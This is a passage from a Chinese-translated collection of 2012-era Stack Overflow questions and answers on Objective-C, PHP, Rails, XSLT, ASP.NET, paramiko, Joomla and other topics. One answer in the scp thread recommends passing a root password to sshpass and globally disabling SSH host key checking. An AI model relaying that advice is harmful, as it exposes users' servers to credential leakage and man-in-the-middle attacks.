int text = arc4random() % 5; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T08:55:31.360

```
@interface ViewController1 ()

@end

@implementation ViewController1

-(IBAction)random {

    // Pseudocode here
    if (srand() not yet called) then
      srand();
    endif
    // end Pseudocode

    // You are better to put the call to srand() somewhere 
    // it will only ever be called once, rather than having
    // to mess around with an if-statement.

    int text = arc4random() % 50;

    switch (text) {

        case 0:

            textview.text = @"My text here";

            break;

   default:

            break;

    }

} 
```

# iphone - 为iphone 5分辨率开发，4s分辨率怎么办？

> ID：12839089
> 
> 赞同：0
> 
> 时间：2012-10-11T12:02:58.387
> 
> 标签：iphone, retina-display, iphone-5

我对 iphone 5 的分辨率有疑问，似乎 xcode 4.5 添加了一个新的视图大小类型名称“retina 4 full screen”（它在属性检查器上）。

![在此处输入图像描述](../Images/a3da5a3326df6930cd11b81307f257bb.png)

如果我尝试使用此分辨率查看并在 iphone 5.1 模拟器上运行它，它会崩溃。

那么，有没有办法开发到支持 iphone 4 或更早版本的 iphone 5？

控制台消息说：*** 由于未捕获的异常“NSInternalInconsistencyException”而终止应用程序，原因：“NIB 数据无效。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-15T06:37:37.300

当您使用 AutoLayout 并在运行低于 iOS 6 的任何设备上运行应用程序时，就会发生这种情况。如果您的部署目标设置为 iOS 6.0，您确实可以为 iPhone 5 开发并仍然支持 iPhone 4 或更早版本。如果您仍想支持较旧的 iOS 版本，请取消选中 NIB 文件的“使用自动布局”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T12:05:07.867

你不应该在 5.1 模拟器上使用它。iPhone 5 仅支持 iOS 6。

# facebook - 通过通知 API 从应用程序向用户发送通知

> ID：12839090
> 
> 赞同：8
> 
> 时间：2012-10-11T12:03:07.943
> 
> 标签：facebook, facebook-graph-api

我想通过通知 API 从应用程序向已验证我的应用程序的用户发送通知。任何人都可以帮我解决这个问题吗？任何帮助将不胜感激。

可以说，我希望用户在我的应用中发生某些事件时收到通知

提前致谢

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-10-12T05:20:41.130

我自己找到了解决方案。开发者需要遵循以下步骤：

1.  [从https://developers.facebook.com/docs/reference/php/](https://developers.facebook.com/docs/reference/php/)下载 facebook sdk for php
2.  运行以下代码段：

代码：

```
require_once "facebook-php-sdk/facebook.php";

$facebook = new Facebook();

$app_id = YOUR_APP_ID;

$app_secret = YOUR_APP_SECRET;

$app_access_token = $app_id . '|' . $app_secret;

$response = $facebook->api( '/RECEIVER_USER_ID/notifications', 'POST', array(

                'template' => 'You have received a new message.',

                'href' => 'RELATIVE URL',

                'access_token' => $app_access_token
            ) );    

print_r($response); 
```

## 如果一切正常，那么您将获得以下输出：

```
Array

(

    [success] => 1
) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-04-19T14:35:03.483

这是@Aakash 对此问题的回复的更新代码。

```
require_once __DIR__ . '/src/Facebook/autoload.php'; // download official fb sdk for php @ https://github.com/facebook/php-graph-sdk
$fb = new Facebook\Facebook([
  'app_id' => '18341642425638', // sample app id
  'app_secret' => '1a8a4037df4d49e5712310c8ad7a62f', // sample app secret
  'default_graph_version' => 'v2.12',
]);

try {
  // Returns a `Facebook\FacebookResponse` object
  $response = $fb->post('/{user_id}/notifications?access_token=1X34XXXXXX25X38|kxXXxxXXXXX3Y&href=&template=@[user_id] Message to display (180 Characters))', 'user_app_token');

} catch(Facebook\Exceptions\FacebookResponseException $e) {
  echo 'Graph returned an error: ' . $e->getMessage();
  exit;
} catch(Facebook\Exceptions\FacebookSDKException $e) {
  echo 'Facebook SDK returned an error: ' . $e->getMessage();
  exit;
}

var_dump($response); 
```

$response 变量应该返回一个只有一个元素 "success" => 1 的数组。

[此处](https://developers.facebook.com/tools/accesstoken/)提供了所有必要的变量。

[您可以在此处](https://developers.facebook.com/tools/explorer/)尝试模拟并向自己发送通知。

这里是[文档](https://developers.facebook.com/docs/games/services/appnotifications)。

# xml - 需要通过使用 XSLT 传递 2 个参数值和 record_type='VALID' 来获取记录数

> ID：12839095
> 
> 赞同：1
> 
> 时间：2012-10-11T12:03:12.327
> 
> 标签：xml, xslt, xpath, tibco

我有一个如下所示的 XML 文档。当record_type ='VALID'时，我需要获取每个LOCATION_NAME 和FILE_TYPE 的记录数。LOCATION_NAME 和 FILY_TYPE 在参数中。对于这两个参数，我必须在 RECORD_TYPE='VALID' 时获取记录数。

我将为每次迭代（循环）提供一个 LOCATION_NAME 和一个 FILY_TYPE，并且需要计数。输入参数将由外部系统传递（本例中为 Tibco JDBC QUERY 结果）。

```
<root>
<SellOutRecord>
    <FILE_TYPE>STOSO</FILE_TYPE>
    <RECORD_TYPE>VALID</RECORD_TYPE>
    <RECORD_NO>1</RECORD_NO>
    <LOCATION_NAME>XYZ el</LOCATION_NAME>
</SellOutRecord>
<SellOutRecord>
    <FILE_TYPE>STOSO</FILE_TYPE>
    <RECORD_TYPE>ERROR</RECORD_TYPE>
    <RECORD_NO>2</RECORD_NO>
    <LOCATION_NAME>XYZ el</LOCATION_NAME>
</SellOutRecord>
<SellOutRecord>
    <FILE_TYPE>STOSO</FILE_TYPE>
    <RECORD_TYPE>VALID</RECORD_TYPE>
    <RECORD_NO>3</RECORD_NO>
    <LOCATION_NAME>XYZ el</LOCATION_NAME>
</SellOutRecord>
<SellOutRecord>
    <FILE_TYPE>STOSO</FILE_TYPE>
    <RECORD_TYPE>WARNING</RECORD_TYPE>
    <RECORD_NO>3</RECORD_NO>
    <LOCATION_NAME>XYZ el</LOCATION_NAME>
</SellOutRecord>
<SellOutRecord>
    <FILE_TYPE>STOSO</FILE_TYPE>
    <RECORD_TYPE>ERROR</RECORD_TYPE>
    <RECORD_NO>4</RECORD_NO>
    <LOCATION_NAME>XYZ el</LOCATION_NAME>
</SellOutRecord>
<SellOutRecord>
    <FILE_TYPE>STOSO</FILE_TYPE>
    <RECORD_TYPE>ERROR</RECORD_TYPE>
    <RECORD_NO>6</RECORD_NO>
    <LOCATION_NAME>XYZ XYZ</LOCATION_NAME>
</SellOutRecord>
<SellOutRecord>
    <FILE_TYPE>STOSO</FILE_TYPE>
    <RECORD_TYPE>VALID</RECORD_TYPE>
    <RECORD_NO>7</RECORD_NO>
    <LOCATION_NAME>XYZ XYZ</LOCATION_NAME>
</SellOutRecord>
<SellOutRecord>
    <FILE_TYPE>STOSO</FILE_TYPE>
    <RECORD_TYPE>VALID</RECORD_TYPE>
    <RECORD_NO>8</RECORD_NO>
    <LOCATION_NAME>XYZ XYZ</LOCATION_NAME>
</SellOutRecord>
<SellOutRecord>
    <FILE_TYPE>STOSO</FILE_TYPE>
    <RECORD_TYPE>ERROR</RECORD_TYPE>
    <RECORD_NO>9</RECORD_NO>
    <LOCATION_NAME>XYZ XYZ</LOCATION_NAME>
</SellOutRecord>
<SellOutRecord>
    <FILE_TYPE>STOSO</FILE_TYPE>
    <RECORD_TYPE>VALID</RECORD_TYPE>
    <RECORD_NO>10</RECORD_NO>
    <LOCATION_NAME>XYZ XYZ</LOCATION_NAME>
</SellOutRecord>
<InventoryRecord>
    <FILE_TYPE>STOIV</FILE_TYPE>
    <RECORD_TYPE>ERROR</RECORD_TYPE>
    <RECORD_NO>2</RECORD_NO>
    <LOCATION_NAME>XYZ el</LOCATION_NAME>
</InventoryRecord>
<InventoryRecord>
    <FILE_TYPE>STOIV</FILE_TYPE>
    <RECORD_TYPE>VALID</RECORD_TYPE>
    <RECORD_NO>4</RECORD_NO>
    <LOCATION_NAME>XYZ el</LOCATION_NAME>
</InventoryRecord>
<InventoryRecord>
    <FILE_TYPE>STOIV</FILE_TYPE>
    <RECORD_TYPE>VALID</RECORD_TYPE>
    <RECORD_NO>5</RECORD_NO>
    <LOCATION_NAME>XYZ el</LOCATION_NAME>
</InventoryRecord>
<InventoryRecord>
    <FILE_TYPE>STOIV</FILE_TYPE>
    <RECORD_TYPE>ERROR</RECORD_TYPE>
    <RECORD_NO>8</RECORD_NO>
    <LOCATION_NAME>XYZ XYZ</LOCATION_NAME>
</InventoryRecord>
<InventoryRecord>
    <FILE_TYPE>STOIV</FILE_TYPE>
    <RECORD_TYPE>ERROR</RECORD_TYPE>
    <RECORD_NO>9</RECORD_NO>
    <LOCATION_NAME>XYZ XYZ</LOCATION_NAME>
</InventoryRecord>
<InventoryRecord>
    <FILE_TYPE>STOIV</FILE_TYPE>
    <RECORD_TYPE>VALID</RECORD_TYPE>
    <RECORD_NO>11</RECORD_NO>
    <LOCATION_NAME>XYZ XYZ</LOCATION_NAME>
</InventoryRecord>
<InventoryRecord>
    <FILE_TYPE>STOIV</FILE_TYPE>
    <RECORD_TYPE>VALID</RECORD_TYPE>
    <RECORD_NO>14</RECORD_NO>
    <LOCATION_NAME>XYZ XYZ</LOCATION_NAME>
</InventoryRecord>
<SalesInRecord>
    <FILE_TYPE>STOSI</FILE_TYPE>
    <RECORD_TYPE>VALID</RECORD_TYPE>
    <RECORD_NO>1</RECORD_NO>
    <LOCATION_NAME>XYZ el</LOCATION_NAME>
</SalesInRecord>
<SalesInRecord>
    <FILE_TYPE>STOSI</FILE_TYPE>
    <RECORD_TYPE>ERROR</RECORD_TYPE>
    <RECORD_NO>2</RECORD_NO>
    <LOCATION_NAME>XYZ el</LOCATION_NAME>
</SalesInRecord>
<SalesInRecord>
    <FILE_TYPE>STOSI</FILE_TYPE>
    <RECORD_TYPE>VALID</RECORD_TYPE>
    <RECORD_NO>3</RECORD_NO>
    <LOCATION_NAME>XYZ el</LOCATION_NAME>
</SalesInRecord>
<SalesInRecord>
    <FILE_TYPE>STOSI</FILE_TYPE>
    <RECORD_TYPE>WARNING</RECORD_TYPE>
    <RECORD_NO>3</RECORD_NO>
    <LOCATION_NAME>XYZ el</LOCATION_NAME>
</SalesInRecord>
<SalesInRecord>
    <FILE_TYPE>STOSI</FILE_TYPE>
    <RECORD_TYPE>ERROR</RECORD_TYPE>
    <RECORD_NO>4</RECORD_NO>
    <LOCATION_NAME>XYZ el</LOCATION_NAME>
</SalesInRecord>
<SalesInRecord>
    <FILE_TYPE>STOSI</FILE_TYPE>
    <RECORD_TYPE>ERROR</RECORD_TYPE>
    <RECORD_NO>7</RECORD_NO>
    <LOCATION_NAME>XYZ XYZ</LOCATION_NAME>
</SalesInRecord>
<SalesInRecord>
    <FILE_TYPE>STOSI</FILE_TYPE>
    <RECORD_TYPE>VALID</RECORD_TYPE>
    <RECORD_NO>8</RECORD_NO>
    <LOCATION_NAME>XYZ XYZ</LOCATION_NAME>
</SalesInRecord>
<SalesInRecord>
    <FILE_TYPE>STOSI</FILE_TYPE>
    <RECORD_TYPE>WARNING</RECORD_TYPE>
    <RECORD_NO>8</RECORD_NO>
    <LOCATION_NAME>XYZ XYZ</LOCATION_NAME>
</SalesInRecord>
<SalesInRecord>
    <FILE_TYPE>STOSI</FILE_TYPE>
    <RECORD_TYPE>ERROR</RECORD_TYPE>
    <RECORD_NO>10</RECORD_NO>
    <LOCATION_NAME>XYZ XYZ</LOCATION_NAME>
</SalesInRecord>
</root> 
```

例如，如果我提供 1\. LOCATION_NAME=XYZ XYZ 和 FILE_TYPE='STOSI' 那么我应该得到 valid_rec_count=1 2\. LOCATION_NAME=XYZ el 和 FILE_TYPE='STOIV' 那么我应该得到 valid_rec_count=2

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T12:53:47.197

**使用**：

```
count(/*/*[RECORD_TYPE='VALID']
            [FILE_TYPE = $pfileType and LOCATION_NAME = $pLocname]
     ) 
```

# php - Zend Framework2 中的分段错误试图添加到 sqlite db

> ID：12839096
> 
> 赞同：3
> 
> 时间：2012-10-11T12:03:16.407
> 
> 标签：php, sqlite, apache2, segmentation-fault, zend-framework2

我目前正在尝试使用[Zend Framework 2 Tutorial](http://framework.zend.com/manual/2.0/en/user-guide/overview.html)。

我在 Solaris 系统上使用带有 Zend Engine v2.4.0 的 Apache 2 和 php 5.4.7。

我设法创建了我需要的一切，但是当我想从我的列表中添加或删除专辑时，Apache 子进程总是崩溃并给出分段错误。我用gdb httpd回溯了这个，运行-X直到错误发生，发现最后一次执行某事的帧试图获取Zend的StringLength.php:169的函数isValid()

添加或编辑专辑时，用户必须提供艺术家数据和专辑名称，然后点击提交按钮。现在在验证表单的输入时崩溃了。

我尝试添加单个字符名称，包含名称的 üöä 和简单的名称，如“simon the cat”，一切都失败了。

你有什么建议可能是什么问题？

编辑：

我对错误进行了更多定位。

```
public function isValid($value)
{
    if (!is_string($value)) {
        $this->error(self::INVALID);
        return false;
    }
/*
    $this->setValue($value);
    if ($this->getEncoding() !== null) {
        $length = iconv_strlen($value, $this->getEncoding());
    } else {
        $length = iconv_strlen($value);
    }

    if ($length < $this->getMin()) {
        $this->error(self::TOO_SHORT);
    }
*/
    if (null !== $this->getMax() && $this->getMax() < $length) {
        $this->error(self::TOO_LONG);
    }

    if (count($this->getMessages())) {
        return false;
    } else {
        return true;
    }
} 
```

分段错误在 isValid() 中的注释之间引发。也许它与 getEncoding() 方法有关？

编辑2：

问题与iconv_strlen有关，但不知道为什么：/如果您只使用普通的strlen（），效果很好

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-09T17:15:28.857

我不明白你到底想做什么。

看来您正在使用一些验证类：Zend\Validator\StringLength？还是我错了？

你能为验证者提供你的初始数据吗？

# events - Magento 添加新产品事件观察者

> ID：12839097
> 
> 赞同：3
> 
> 时间：2012-10-11T12:03:22.123
> 
> 标签：events, magento

管理员添加到目录的新产品的事件观察者是什么？添加或更新新产品时，我需要发送请求。是否有可用的事件观察者？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-11T12:30:17.987

您可以使用

```
catalog_product_new_action

catalog_product_edit_action

catalog_product_prepare_save

catalog_controller_product_delete 
```

更多信息参考[wiki magento 事件参考](http://www.magentocommerce.com/wiki/5_-_modules_and_development/reference/magento_events)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-09-19T06:08:54.230

你可以试试 ：

```
<catalog_product_save_before>
        <observers>
            <yourmodule>
                <type>singleton</type>
                <class>yourmodule/observer</class>
                <method>catalog_product_save_before</method>
            </yourmodule>
        </observers>
    </catalog_product_save_before>

    <catalog_product_save_after>
        <observers>
            <yourmodule>
                <type>singleton</type>
                <class>yourmodule/observer</class>
                <method>catalog_product_save_after</method>
            </yourmodule>
        </observers>
    </catalog_product_save_after> 
```

[http://blog.chapagain.com.np/magento-event-observer-with-save-before-and-save-after/](http://blog.chapagain.com.np/magento-event-observer-with-save-before-and-save-after/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-01-02T22:07:22.023

尝试使用`catalog_product_save_after`.

# ruby-on-rails - 路由错误。使用 get 而不是 put 进行渲染...为什么？

> ID：12839099
> 
> 赞同：0
> 
> 时间：2012-10-11T12:03:27.583
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, rest, routing

我有以下代码：

**任务/_form.html.haml**

```
%h3 
    Tasks
%span.form-inline.centered
    = form_for [@activity, @task], remote: true do |f|
        = f.text_field :description, {placeholder: 'Enter task description and click + to create a new task', class: 'input-task'}
        = f.submit "+", class: 'btn btn-danger' 
```

**控制器/tasks_controller.rb**

```
 def create
    activity = Activity.find(params[:activity_id])

    flash[:error] = I18n.t "errors.task.generic" if !activity.add_task!(params[:task])    

    @task = activity.tasks.last

    respond_to do |format|
      format.html { redirect_to activity_path(activity) }
      format.js
    end
  end 
```

**任务/create.js.erb**

```
$('#incomplete-tasks').append("<%= j render partial: 'task', locals: {task: @task} %>"); 
```

**任务/_task.html.haml**

```
%li
    = task.description
    = link_to "Done", activity_task_path(task.activity, task: task), html_options = {method: :put, class: 'pull-right'} 
```

我遇到的问题是，当它尝试使用 js 渲染部分时，我的 restful 资源`activity_task_path`发送了一个 get 方法，而不是我指定的 put 方法。如果我不使用 js 渲染它，我只是刷新浏览器，它工作正常。我现在收到路由错误，因为我没有显示页面。然而我不需要一个。我只需要它通过 put 方法更新我的任务。如果有人能解释为什么会发生这种情况，我将不胜感激。

**[编辑1]**

如果您有任何问题或需要我添加任何代码或我能做的任何其他事情来帮助让我知道。我真的不明白为什么会这样。谢谢你。

**[编辑2]**

```
 def update
    activity = Activity.find(params[:id])
    activity.update_task!(params[:task])
    redirect_to activity_path(params[:id])
  end 
```

这是我的更新控制器。

**[编辑3]**

[您可以在https://trackit.mlpinit.com](https://trackit.mlpinit.com)上在线找到该应用程序，以更好地了解我想要做什么。您可以使用我将确认设置为 2.days 的随机电子邮件地址进行身份验证。

**[编辑4]**

希望让它更清楚......这是我通过ajax添加新任务时遇到的错误。

路由错误

**没有路线匹配**

```
 {:action=>"show", :controller=>"tasks", :task=>#<Task id: 64, description: "lalala", complete: false, created_at: "2012-10-11 19:41:22", updated_at: "2012-10-11 19:41:22", activity_id: 6>, :activity_id=>#<Activity id: 6, title: "Lala", description: "this is lala", created_at: "2012-10-10 18:37:18", updated_at: "2012-10-10 18:37:18", user_id: 2, activity_group_id: nil>} 
```

如果我不通过 ajax 调用再次执行此操作，它可以正常工作。我的假设是问题的发生是因为它由于某种原因不理解 put 方法......

**[编辑5]**

**如果我从我的 _task 部分获取链接，则附加会发生而没有任何错误。我想我应该提一下**

**[编辑6]**

我将添加一个视觉演练，以确保我让自己理解......

我有一个任务表：

![任务表](../Images/2acdabe683321191b464387071cbb8e3.png)

我输入任务名称

![在此处输入图像描述](../Images/1cced3a536b2e05023416d13be688464.png)

我点击（输入）加号来创建它。

我收到上面也出现的以下错误：

![在此处输入图像描述](../Images/310586e7468ed20fd2115d336cf71d1c.png) ![在此处输入图像描述](../Images/eb416b88e4ef983c997c2a85091e053f.png)

如果我点击刷新，任务生成正常：

![在此处输入图像描述](../Images/24959564db47ddf92224da87554db31f.png)

这就是为什么我认为它必须在 .js.erb 文件中......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T13:38:20.133

看`rake routes | grep task`：

```
 activity_task GET    /activities/:activity_id/tasks/:id(.:format)      tasks#show
                PUT    /activities/:activity_id/tasks/:id(.:format)      tasks#update 
```

然后检查在浏览器中给您带来问题的生成链接，检查它是否与`update`路由对应以及是否具有`data-method="put"`属性。

好的，我已经登录查看了，生成的链接不好：

```
<a href="/activities/17/tasks/17?task=5" class="pull-right" data-method="put" rel="nofollow">Done</a> 
```

该`17?task=5`部分搞砸了，应该是：`/activities/17/tasks/5`。

**[编辑]**

更改链接：

```
= link_to "Done", activity_task_path(:activity_id => task.activity_id, :id => task.id), html_options = {method: :put, class: 'pull-right'} 
```

路由错误显示:activity_id下有一个对象而不是只有id，并且该`:task`属性是不必要的，应该`:id`有一个任务id值。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T13:49:15.627

```
activity_task_path(task.activity, task: task) 
```

activity_task_path 需要两个 id 参数，我认为你的最后一个现在与任务混合：任务和 post 参数。由于 form_for 并尝试使用此方法对任务使用“更新”，您也会得到混淆。您没有提供任何数据字段。

所以我认为你的解决方案是：

```
activity_task_path(task.activity, task) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T13:06:01.807

您是否确保正在加载 Rails 不显眼的 JavaScript 驱动程序**rails.js？**我会确保以下行在您的**Gemfile**中：

```
gem 'jquery-rails', '~> 2.1' 
```

如果您使用的是 Rails 3.1，请将其包含在**application.js**中：

```
//= require jquery
//= require jquery_ujs 
```

如果您需要有关安装它的更详细说明，请查看[此内容。](https://github.com/rails/jquery-ujs)

# javascript - VB.net 从确认框中检索值

> ID：12839100
> 
> 赞同：0
> 
> 时间：2012-10-11T12:03:30.127
> 
> 标签：javascript, asp.net, vb.net

用外行的话来说，基本上我想做的是：

我正在将数据集导出到 csv 文件，如果文件超过预定大小，则允许用户选择通过电子邮件发送而不是下载。（因此，如果文件 > 10Mb 警报消息，可选择通过电子邮件发送或继续下载）

IE“点击是发送电子邮件，点击否下载”

和

检索用户选择

任何指导将不胜感激。

编辑：好的，这是我尝试过的

脚本

```
 function confirmBox()
            {
                var hSize =  document.getElementById('<%= hFileSize.ClientID %>');
                if (hSize.value > 100)
                {
                    if (confirm(" Values is greater than 100\. Continue?")==true)
                         return true;
                    else
                        return false;
                 }
            } 
```

ASP 按钮：

```
 <asp:Button ID="cmdExport" runat="server" Text="Export" OnClick="cmdExport_Click" OnClientClick="return confirmBox();"/> 
```

但问题是消息框是在后面的代码运行以生成 CSV 文件并获取文件大小之前在客户端生成的。所以只有在我生成 CSV 并获得文件大小后才需要显示消息框？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:09:08.997

**基于更新帖子的新答案**

在这种情况下，您需要在提交参数后发送 ajax 请求来确定文件大小。如果值大于 10Mb，则显示弹出窗口。否则向服务器提交完整的请求以下载文件。

从消息框中，如果用户单击“是”，则将完整请求发送回服务器以发送带有附件的电子邮件。如果用户单击否，则发送完整请求以下载文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T09:29:39.887

我设法通过使用我目前正在使用的第三方 Telerik 解决了我的问题。通过实施 Radtooltips/Radwindows。 [http://www.telerik.com/](http://www.telerik.com/)

# firefox - 火狐 gwt iframe

> ID：12839102
> 
> 赞同：-1
> 
> 时间：2012-10-11T12:03:37.303
> 
> 标签：firefox, gwt, iframe

我买了一个用 aspx 制作的网站 [http://mesametal.set-soft.com/Anasayfa/en]。我想在其中添加 IFRAME，并在其中添加 gwt 代码。（按上面链接上的颜色代码徽标即可查看。

在 IE9 中，每次我的 IFrame 弹出窗口和我的 gwt 代码都在其中运行时效果很好。

然而;

在 Firefox 15 中，第一次运行时我的 IFrame 弹出窗口和我的 gwt 代码运行它。但是当我关闭它并单击徽标以再次打开弹出窗口时，gwt 代码不再在 Iframe 上运行。

我认为这不是关于 gwt，而是关于 firefox。smo 可以指导我做什么吗？

问候

图加尔桑卡拉巴卡克

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:15:16.930

我认为这是一个 Xross-Domain 问题：

铬合金：

```
Unsafe JavaScript attempt to access frame with URL http://mesametal.set-soft.com/Anasayfa/en from frame with URL http://88.247.142.52:8080/Color/?subProgram=color&lng=en. Domains, protocols and ports must match. 
```

火狐：

```
[14:14:27.956] Error: Permission denied to access property 'document' @ http://88.247.142.52:8080/Color/?subProgram=color&lng=en:41 
```

编译项目并将其添加到与您网站的其余部分相同的服务器。使用新的 firefox DevBar 或 Firebug。并查看错误控制台。

# python - 2个远程主机之间的scp - 没有密码

> ID：12839106
> 
> 赞同：2
> 
> 时间：2012-10-11T12:03:55.193
> 
> 标签：python, ssh, paramiko

我使用 paramiko 模块，我可以简单地将文件放入和从远程主机获取文件。有没有办法可以在 2 个远程主机之间复制文件？我的本地主机上有 pem 文件，因此我可以为两台主机建立 ssh。有没有办法我可以在没有（如果可能的话）远程主机上进行额外配置的情况下 - 使用 SSH 密钥并且没有密码？

```
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
privkey = paramiko.RSAKey.from_private_key_file (path_to_priv_key_file)
ssh.connect(host, username = username,  key_filename=path_to_priv_key_file) 
```

我已经连接到远程主机，但是当我尝试

```
cmd = "scp –v /usr/local/1.py user1@hos1:/usr/local"
ssh.exec_command(cmd) 
```

我明白了`Permission denied (publickey).`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-01T06:08:08.103

嘿弗兰切斯卡，

以下 python 伪代码可能会对您有所帮助...将 dest_server、source_file、dest_file 替换为您的适当...它已经过测试并且可以正常工作...

```
import paramiko

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('dest_server-IP', username='user', password='passwd')

print "connected successfully!"

sftp = ssh.open_sftp() 
sftp.put('source_file', 'dest_file_path_in_dest_server') 
sftp.close() 
print "copied successfully!" 
```

干杯，

苏曼思

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-17T23:38:40.923

基本上，您希望在两台机器之间建立无密码连接。除非您可以确保没有其他人可以访问客户端计算机，否则这是很危险的。

看看这里如何创建我多年前在我的博客中描述过的无密码连接。它也将解决 scp 问题。

[http://greg-n-blog.blogspot.com/2009/10/ssh-and-scp-without-being-asked-for.html](http://greg-n-blog.blogspot.com/2009/10/ssh-and-scp-without-being-asked-for.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-10-15T07:00:53.347

试试这个将目录和嵌套的子目录从本地复制到远程：

```
cmd = "sshpass -p {} scp -r {}/* root@{}://{}".format(
    remote_root_pass, 
    local_path, 
    remote_ip, 
    remote_path)
os.system(cmd) 
```

不要忘记导入操作系统，您可以检查返回的退出代码（0表示成功）

此外，您可能需要“yum install sshpass”

并将 /etc/ssh/ssh_config StrictHostKeyChecking ask 更改为： StrictHostKeyChecking no

# mono - 在单声道 4.0 中运行 SesameWindowsClient

> ID：12839108
> 
> 赞同：0
> 
> 时间：2012-10-11T12:04:04.010
> 
> 标签：mono, semantic-web, sesame, ubuntu-12.04

尝试了“mono --runtime=v4.0.30319 SesameWindowsClient.exe”，因为我想从 konsole 运行该程序以获取比从 w5 鼠标点击桌面更多的详细信息。

Ubuntu 精确 12.04，告诉他需要 libgluezilla（认为 libgluezilla 调用可能起源于 libmono-webbrowser4.0-cil），但该包并不精确。我下载并安装了它，但程序一直崩溃。试图下载一个自定义的 libgluezilla 手动编译，但找不到。考虑过手动编译单声道，但我不确定它是否会有所帮助，因为精确的单声道包似乎不是很旧。在这个门户中找到了一个关于它的帖子，但关于 Mac OS。有点卡住。

# joomla - 如何在用户 - 配置文件插件，Joomla 2.5 中更改标签名称

> ID：12839109
> 
> 赞同：0
> 
> 时间：2012-10-11T12:04:09.347
> 
> 标签：joomla, label, joomla2.5, user-profile

我已经使用 Joomla 2.5 创建了网站。在这个网站上，我使用了注册。对于注册，我使用了默认的 Joomla 注册。在表单中，我通过激活“用户 - 个人资料”插件添加了电话和国家字段。现在我想将电话的标签更改为联系号码，将国家/地区更改为位置。知道如何完成这项工作吗？

请注意，我已将文件 /language/en-GB/en-GB.com_users.ini 中的名称标签更改为全名，电子邮件地址更改为电子邮件 ID，但是我不知道从哪里获取电话和国家/地区的数据.

知道我可以在哪里以及如何改变吗？任何想法/提示将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T15:12:12.077

虽然这些答案会起作用，但它们不是正确的方法。如果您编辑语言文件，那么如果文件在更新中发生更改，您所做的任何更改都将被覆盖。

Joomla 2.0 具有语言覆盖和出色的语言管理器来帮助您进行更改。您需要做的就是登录管理员，然后单击扩展菜单中的语言管理器。在那里，单击覆盖链接。这将为您提供您创建的所有覆盖的列表。单击“新建”图标以创建新的覆盖，然后只需搜索您要更改的值，或者如果您知道它，则搜索常量。然后，语言管理器将搜索您的所有语言文件以找到您要查找的内容。完成后单击保存按钮，它将创建一个覆盖文件，该文件不仅会更改您想要更改的内容，而且还可以避免未来的更新，因为它不会触及原始语言文件。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-11T12:21:25.867

我认为更改此文件将完成工作-

```
administrator\language\en-GB\en-GB.plg_user_profile.ini 
```

**更新**

避免更改上述文件，而是使用语言覆盖。以下是如何覆盖语言变量的详细信息-

[https://docs.joomla.org/J2.5:Language_Overrides_in_Joomla](https://docs.joomla.org/J2.5:Language_Overrides_in_Joomla)

[https://docs.joomla.org/J3.x:Language_Overrides_in_Joomla](https://docs.joomla.org/J3.x:Language_Overrides_in_Joomla)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T12:21:34.777

打开文件`en-GB.plg_user_profile.ini`（管理员/语言/en-GB/en-GB.plg_user_profile.ini）

更改`PLG_USER_PROFILE_FIELD_COUNTRY_LABEL="Country"`为`PLG_USER_PROFILE_FIELD_COUNTRY_LABEL="Location"`

而已...

# google-maps - 可索引的美国地图

> ID：12839113
> 
> 赞同：0
> 
> 时间：2012-10-11T12:04:22.980
> 
> 标签：google-maps, google-maps-api-3

我想创建一张美国地图，每个州都显示“项目”的数量。当用户单击该状态时，他们将被带到另一个页面（针对该状态） - 就像向下钻取一样。到目前为止，这很简单。但是，我想以一种可以被谷歌和其他搜索引擎索引的方式来做到这一点。有没有办法用 Google Maps API 做到这一点？其他方法可以做到吗？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:12:49.727

如果您的地图基于 KML，[Google 将能够为其编制索引](http://googlemapsapi.blogspot.com/2007/01/get-more-traffic-to-your-maps-api-site.html)（或至少正在编制 KML 索引）。引用您的“状态”页面的[站点地图](http://support.google.com/webmasters/bin/answer.py?hl=en&answer=156184)将让搜索引擎在不跟随您的动态链接的情况下抓取它们。

# html - 区分css中的单选按钮，我无法区分两个不同的单选按钮

> ID：12839114
> 
> 赞同：0
> 
> 时间：2012-10-11T12:04:23.550
> 
> 标签：html, image, css, radio-button

我的注册表页面中有一组单选按钮，编码为：

```
<label for="text"><input type="radio" name="gen" id='gender' value="Male"> Male <input type="radio" name="gen" id='gender' value="Female"> Female </label><br/> 
```

这些显示标准单选按钮。

我的测验页面中有另一组单选按钮，代码

```
<div class='checkoutform'>
    <?php for($i=0;$i<$whatever;$i++){
        if($i==0){
            echo "<div class='fieldlist'>";
            echo "<input class='checkedBox2' name='".$question["id"]."' type='radio' id='shipadd1'>";
            echo "<label for='shipadd1'>";
            echo $contents.'</label>';
            echo "</div>";
        }
        else{
            echo "<div class='fieldlist'>";
            echo "<input type='radio' id='shipadd$j' name='".$question["id"]."'>";
            echo "<label for='shipadd$j'>";
            echo "</div><br/>";
        }
    }
?>
</div> 
```

